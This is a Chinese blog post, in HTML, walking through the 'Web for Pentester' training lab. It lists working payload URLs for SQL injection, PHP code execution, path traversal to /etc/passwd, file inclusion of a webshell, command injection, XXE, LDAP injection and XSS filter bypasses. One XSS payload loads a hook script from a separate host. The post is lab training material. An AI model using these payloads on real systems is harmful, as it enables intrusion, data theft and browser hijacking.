<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="sql注入:(1)没有任何过滤的拼接1http://192.168.3.51/sqli/example1.php?name=root&apos; and 1=12 union select version(),user(),database(),4,5 --+-  (2)只过滤了空白符,用/**/代替即可1http://192.168.3.51/sqli/example2.php?name=root&apos;/**">
<meta name="keywords" content="pentestlab">
<meta property="og:type" content="article">
<meta property="og:title" content="web for pentester writeup">
<meta property="og:url" content="https://apt404.github.io/2016/05/26/web-for-pentester/index.html">
<meta property="og:site_name" content="APT404-不疯不魔怎么活">
<meta property="og:description" content="sql注入:(1)没有任何过滤的拼接1http://192.168.3.51/sqli/example1.php?name=root&apos; and 1=12 union select version(),user(),database(),4,5 --+-  (2)只过滤了空白符,用/**/代替即可1http://192.168.3.51/sqli/example2.php?name=root&apos;/**">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://apt404.github.io/img/sqli1.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli1_s.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli2.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli2_s.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli3.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli3_s.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli4.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli4_s.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli5.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli5_s.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli6.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli6_s.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli7.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli7_s.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli8.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli8_s.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli9.png">
<meta property="og:image" content="https://apt404.github.io/img/sqli9_s.png">
<meta property="og:image" content="https://apt404.github.io/img/code1.png">
<meta property="og:image" content="https://apt404.github.io/img/code1_s.png">
<meta property="og:image" content="https://apt404.github.io/img/code2.png">
<meta property="og:image" content="https://apt404.github.io/img/code2_s.png">
<meta property="og:image" content="https://apt404.github.io/img/code3.png">
<meta property="og:image" content="https://apt404.github.io/img/code3_s.png">
<meta property="og:image" content="https://apt404.github.io/img/code4.png">
<meta property="og:image" content="https://apt404.github.io/img/code4_s.png">
<meta property="og:image" content="https://apt404.github.io/img/dir.png">
<meta property="og:image" content="https://apt404.github.io/img/dir_s.png">
<meta property="og:image" content="https://apt404.github.io/img/dir1.png">
<meta property="og:image" content="https://apt404.github.io/img/dir1_s.png">
<meta property="og:image" content="https://apt404.github.io/img/dir2.png">
<meta property="og:image" content="https://apt404.github.io/img/dir2_s.png">
<meta property="og:image" content="https://apt404.github.io/img/fileinc.png">
<meta property="og:image" content="https://apt404.github.io/img/fileinc_s.png">
<meta property="og:image" content="https://apt404.github.io/img/fileinc1.png">
<meta property="og:image" content="https://apt404.github.io/img/fileinc1_s.png">
<meta property="og:image" content="https://apt404.github.io/img/cmd1.png">
<meta property="og:image" content="https://apt404.github.io/img/cmd1_s.png">
<meta property="og:image" content="https://apt404.github.io/img/cmd2.png">
<meta property="og:image" content="https://apt404.github.io/img/cmd2_s.png">
<meta property="og:image" content="https://apt404.github.io/img/cmd3.png">
<meta property="og:image" content="https://apt404.github.io/img/cmd3_s.png">
<meta property="og:image" content="https://apt404.github.io/img/xxe.png">
<meta property="og:image" content="https://apt404.github.io/img/xxe_s.png">
<meta property="og:image" content="https://apt404.github.io/img/xxe1.png">
<meta property="og:image" content="https://apt404.github.io/img/xxe1_s.png">
<meta property="og:image" content="https://apt404.github.io/img/ldap.png">
<meta property="og:image" content="https://apt404.github.io/img/ldap_s.png">
<meta property="og:image" content="https://apt404.github.io/img/ldap2.png">
<meta property="og:image" content="https://apt404.github.io/img/xss1.png">
<meta property="og:image" content="https://apt404.github.io/img/xss1_s.png">
<meta property="og:image" content="https://apt404.github.io/img/xss2.png">
<meta property="og:image" content="https://apt404.github.io/img/xss2_s.png">
<meta property="og:image" content="https://apt404.github.io/img/xss3.png">
<meta property="og:image" content="https://apt404.github.io/img/xss3_s.png">
<meta property="og:image" content="https://apt404.github.io/img/xss4.png">
<meta property="og:image" content="https://apt404.github.io/img/xss4_s.png">
<meta property="og:image" content="https://apt404.github.io/img/xss5.png">
<meta property="og:image" content="https://apt404.github.io/img/xss5_s.png">
<meta property="og:image" content="https://apt404.github.io/img/xss6.png">
<meta property="og:image" content="https://apt404.github.io/img/xss6_s.png">
<meta property="og:image" content="https://apt404.github.io/img/xss7.png">
<meta property="og:image" content="https://apt404.github.io/img/xss7_s.png">
<meta property="og:image" content="https://apt404.github.io/img/xss8.png">
<meta property="og:image" content="https://apt404.github.io/img/xss8_s.png">
<meta property="og:image" content="https://apt404.github.io/img/xss9.png">
<meta property="og:image" content="https://apt404.github.io/img/xss9_s.png">
<meta property="og:image" content="https://apt404.github.io/img/upload1.png">
<meta property="og:image" content="https://apt404.github.io/img/upload1_s.png">
<meta property="og:image" content="https://apt404.github.io/img/upload1_s_1.png">
<meta property="og:image" content="https://apt404.github.io/img/upload2.png">
<meta property="og:image" content="https://apt404.github.io/img/upload2_s.png">
<meta property="og:image" content="https://apt404.github.io/img/upload2_s_1.png">
<meta property="og:updated_time" content="2017-07-15T04:05:06.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="web for pentester writeup">
<meta name="twitter:description" content="sql注入:(1)没有任何过滤的拼接1http://192.168.3.51/sqli/example1.php?name=root&apos; and 1=12 union select version(),user(),database(),4,5 --+-  (2)只过滤了空白符,用/**/代替即可1http://192.168.3.51/sqli/example2.php?name=root&apos;/**">
<meta name="twitter:image" content="https://apt404.github.io/img/sqli1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>web for pentester writeup</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2016/06/22/Oldlnmp/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2016/05/20/bypass-waf-note/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://apt404.github.io/2016/05/26/web-for-pentester/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://apt404.github.io/2016/05/26/web-for-pentester/&text=web for pentester writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://apt404.github.io/2016/05/26/web-for-pentester/&title=web for pentester writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://apt404.github.io/2016/05/26/web-for-pentester/&is_video=false&description=web for pentester writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=web for pentester writeup&body=Check out this article: https://apt404.github.io/2016/05/26/web-for-pentester/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://apt404.github.io/2016/05/26/web-for-pentester/&title=web for pentester writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://apt404.github.io/2016/05/26/web-for-pentester/&title=web for pentester writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://apt404.github.io/2016/05/26/web-for-pentester/&title=web for pentester writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://apt404.github.io/2016/05/26/web-for-pentester/&title=web for pentester writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://apt404.github.io/2016/05/26/web-for-pentester/&name=web for pentester writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入"><span class="toc-number">1.</span> <span class="toc-text">sql注入:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php代码执行"><span class="toc-number">2.</span> <span class="toc-text">php代码执行:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#任意文件读取"><span class="toc-number">3.</span> <span class="toc-text">任意文件读取:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php文件包含"><span class="toc-number">4.</span> <span class="toc-text">php文件包含:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行"><span class="toc-number">5.</span> <span class="toc-text">命令执行:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE注入"><span class="toc-number">6.</span> <span class="toc-text">XXE注入:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ladp注入"><span class="toc-number">7.</span> <span class="toc-text">ladp注入:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">8.</span> <span class="toc-text">xss:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php文件上传"><span class="toc-number">9.</span> <span class="toc-text">php文件上传:</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        web for pentester writeup
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">APT404-不疯不魔怎么活</span>
      </span>
      
    <div class="postdate">
        <time datetime="2016-05-26T01:03:35.000Z" itemprop="datePublished">2016-05-26</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/pentestlab/">pentestlab</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入:"></a>sql注入:</h2><p>(1)没有任何过滤的拼接<br><img src="/img/sqli1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example1.php?name=root' and 1=12 union select version(),user(),database(),4,5 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli1_s.png" alt="&#39;&#39;"><br></p>
<p>(2)只过滤了空白符,用/**/代替即可<br><img src="/img/sqli2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example2.php?name=root'/</span>**<span class="regexp">/and/</span>**<span class="regexp">/1=112/</span>**<span class="regexp">/union/</span>**<span class="regexp">/select/</span>**<span class="regexp">/1,database(),3,4,5/</span>**<span class="regexp">/%23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli2_s.png" alt="&#39;&#39;"><br></p>
<p>(3)跟上面一样,只不过这次过滤了多个空白符,bypass方法同上<br><img src="/img/sqli3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example3.php?name=root'/</span>**<span class="regexp">/and/</span>**<span class="regexp">/1=12/</span>**<span class="regexp">/union/</span>**<span class="regexp">/select/</span>**<span class="regexp">/user(),2,3,4,5/</span>**<span class="regexp">/%23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli3_s.png" alt="&#39;&#39;"><br></p>
<p>(4)用mysql_real_escape_string()把传过来的id先转义再拼接,其实这里跟没任何过滤是一样的,因为我们的注入语句里根本也没有单引号这类敏感字符<br><img src="/img/sqli4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example4.php?id=2 and 12=1 union select 1,version(),3,4,5 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli4_s.png" alt="&#39;&#39;"><br></p>
<p>(5)要求开头是任意数字,开头本来就是数字呀,搞不懂,所以根本不存在什么绕过,正常写注入语句即可<br><img src="/img/sqli5.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example5.php?id=2 and 1=12 union select version(),2,3,4,5 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli5_s.png" alt="&#39;&#39;"><br></p>
<p>(6)要求结尾是任意数字,那就按它说的呗,结尾随便给个数字就好了<br><img src="/img/sqli6.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example6.php?id=2 and 1=12 union select version(),2,3,4,5 %233</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli6_s.png" alt="&#39;&#39;"><br></p>
<p>(7)注意这里的’/m修饰符,对,没错,就是它,表示多行匹配,所以用%0a换行下即可绕过<br><img src="/img/sqli7.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example7.php?id=2%0aand%0a1=112%0aunion%0aselect%0auser(),2,3,4,5%0a%23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli7_s.png" alt="&#39;&#39;"><br></p>
<p>(8)用mysql_real_escape_string()做了下转义,而后再拼接,不过需要注意下,这里是用反引号闭合的,虽然没法正常注入,不过盲注依然可行的<br><img src="/img/sqli8.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example8.php?order=name`,(if((ascii(mid((select version()),1,1))=53),sleep(5),1))%23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli8_s.png" alt="&#39;&#39;"></p>
<p>(9)同上,利用时间盲注依然是可行的<br><img src="/img/sqli9.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example9.php?order=name,(if((ascii(mid((select version()),1,1))=53),sleep(5),1))%23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli9_s.png" alt="&#39;&#39;"><br><br></p>
<h2 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行:"></a>php代码执行:</h2><p>(1)把没有任何过滤的内容就直接给eval,将前后的双引号闭合即可<br><img src="/img/code1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example1.php?name=";system('ls -la');phpinfo();/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/code1_s.png" alt="&#39;&#39;"><br></p>
<p>(2)同样,对传入的值没有任何过滤,crate_function()相必大家都已经非常熟悉了,专门用来组装函数,在以前的各类php代码执行漏洞中经常能看到它的影子,它会出现代码执行的根本原因还是它内部还会有个eval的动作<br><img src="/img/code2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example2.php?order=id,$b-&gt;name);&#125;system('ls -al');/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/code2_s.png" alt="&#39;&#39;"><br></p>
<p>(3)preg_replace()本来是个挺正常的正则替换函数,但加了/e修正符后,瞬间就污了很多,要替换的内容的那一部分会被当做php代码来执行<br><img src="/img/code3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example3.php?new=system('ls -l')&amp;pattern=/lamer</span><span class="regexp">/e&amp;base=Hello lamer</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/code3_s.png" alt="&#39;&#39;"><br></p>
<p>(4)闭合前面的单引号,再拼接自己的php代码即可,典型的代码执行函数assert(),不多说,大家应该非常熟悉了,各类php一句话中经常也能看到<br><img src="/img/code4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example4.php?name=hacker'.system('ls -la');/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/code4_s.png" alt="&#39;&#39;"><br><br><br></p>
<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取:"></a>任意文件读取:</h2><p>(1)对传入的文件路径没有进行任何过滤,直接跟上要读的文件即可<br><img src="/img/dir.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example1.php?file=../</span>../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/dir_s.png" alt="&#39;&#39;"><br></p>
<p>(2)把’/var/www/files/‘这个路径截掉,然后只取后面的文件名,绕过自然也很简单,在这个路径的基础上继续跟上正常的文件路径即可<br><img src="/img/dir1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example2.php?file=/var</span><span class="regexp">/www/files</span><span class="regexp">/../</span>../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/dir1_s.png" alt="&#39;&#39;"><br></p>
<p>(3)拼接了个.png的后缀,%00截断后缀php高版本早已修复该漏洞<br><img src="/img/dir2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example3.php?file=../</span>../../../etc/passwd%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/dir2_s.png" alt="&#39;&#39;"><br><br></p>
<h2 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含:"></a>php文件包含:</h2><p>(1)没有任何过滤的包含,直接包含本地的webshell即可,如下,被包含的大马正常执行<br><img src="/img/fileinc.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/fileincl</span><span class="regexp">/example1.php?page=../upload</span><span class="regexp">/images/</span><span class="number">404</span>.php</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/fileinc_s.png" alt="&#39;&#39;"><br></p>
<p>(2)在后面拼接了个.php的后缀,同样,利用%00截断<br><img src="/img/fileinc1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/fileincl</span><span class="regexp">/example2.php?page=../upload</span><span class="regexp">/images/</span><span class="number">404</span>.php%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/fileinc1_s.png" alt="&#39;&#39;"><br><br></p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h2><p>(1)没有任何过滤的传入,在linux中可用分号分割连续执行多个命令,win中可用&amp;&amp;<br><img src="/img/cmd1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/commandexec</span><span class="regexp">/example1.php?ip=127.0.0.1;ls -la</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/cmd1_s.png" alt="&#39;&#39;"><br></p>
<p>(2)一眼看去,这个ip正则确实没法突破,但后面却紧跟了个/m修饰符,不得不又让我想起了%0a换行<br><img src="/img/cmd2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/commandexec</span><span class="regexp">/example2.php?ip=127.0.0.1%0als -la</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/cmd2_s.png" alt="&#39;&#39;"><br></p>
<p>(3)header()后面竟然没有结束脚本,大忌,header()只是跳转到指定页面,但如果你不手工结束当前脚本,即使跳到别的页面,当前脚本也依然会执行完再退出<br><img src="/img/cmd3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/commandexec</span><span class="regexp">/example1.php?ip=127.0.0.1;ls -la</span></span><br><span class="line"><span class="regexp">C:\&gt;curl "192.168.3.51/commandexec</span><span class="regexp">/example3.php?ip=127.0.0.1;ls"   注意这里不能用浏览器了,因为它会跳过去,不过,你可以用curl来看结果</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/cmd3_s.png" alt="&#39;&#39;"><br><br></p>
<h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入:"></a>XXE注入:</h2><p>(1) 对外部的xml数据没有任何过滤,此时创建一个外部实体,而实体的作用是读取/etc/passwd文件,然后引用该实体,注意要url编码下<br><img src="/img/xxe.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example1.php?xml=&lt;!DOCTYPE result [&lt;!ENTITY res SYSTEM "file:/</span><span class="regexp">//etc</span><span class="regexp">/passwd" &gt;]&gt;&lt;text&gt;&amp;res;&lt;/text</span>&gt;</span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example1.php?xml=%3C%21DOCTYPE%20result%20%5B%3C%21ENTITY%20res%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%20%3E%5D%3E%3Ctext%3E%26res%3B%3C%2ftext%3E</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xxe_s.png" alt="&#39;&#39;"><br></p>
<p>(2)没有任何过滤的拼接<br><img src="/img/xxe1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example2.php?name=hacker'] | /</span><span class="regexp">/*| /</span><span class="regexp">/*['</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xxe1_s.png" alt="&#39;&#39;"><br><br><br><br></p>
<h2 id="ladp注入"><a href="#ladp注入" class="headerlink" title="ladp注入:"></a>ladp注入:</h2><p>(1)ldap允许匿名登录<br><img src="/img/ldap.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/ldap</span><span class="regexp">/example1.php</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/ldap_s.png" alt="&#39;&#39;"><br></p>
<p>(2)闭合原有的过滤器,把后面的password截断即可<br><img src="/img/ldap2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/ldap</span><span class="regexp">/example2.php?name=hacker)(cn=*))%00&amp;password=hacker</span></span><br></pre></td></tr></table></figure></p>
<p><br><br></p>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss:"></a>xss:</h2><p>(1)没有任何过滤的情况<br><img src="/img/xss1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example1.php?name=&lt;script&gt;alert('hello')&lt;/script</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss1_s.png" alt="&#39;&#39;"><br></p>
<p>(2)只过滤了’<script>‘和’</script>‘，大小写转换<br><img src="/img/xss2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example2.php?name=&lt;Script&gt;alert('hello')&lt;/s</span>Cript&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss2_s.png" alt="&#39;&#39;"><br></p>
<p>(3)这次依然是过滤’<script></script>‘,且不区分大小写,在&gt;前面加个空格即可绕过<br><img src="/img/xss3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example3.php?name=&lt;ScripT &gt;alert('hello')&lt;/</span>Script &gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss3_s.png" alt="&#39;&#39;"><br></p>
<p>(4)不分区大小写过滤了’script’字符,没关系,把它转成对应的ASCII就好了<br><img src="/img/xss4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example4.php?name=&lt;svg/onload</span>=<span class="string">"var i=String.fromCharCode(115, 99, 114, 105, 112, 116);s = createElement(i);body.appendChild(s);s.src='http://192.168.3.28:3000/hook.js';"</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss4_s.png" alt="&#39;&#39;"><br></p>
